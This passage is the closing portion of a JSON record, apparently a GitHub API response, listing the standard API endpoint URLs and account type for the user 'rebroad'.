         "organizations_url" : "https://api.github.com/users/rebroad/orgs",
         "received_events_url" : "https://api.github.com/users/rebroad/received_events",
         "repos_url" : "https://api.github.com/users/rebroad/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/rebroad/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/rebroad/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/rebroad"
      }
   }
]
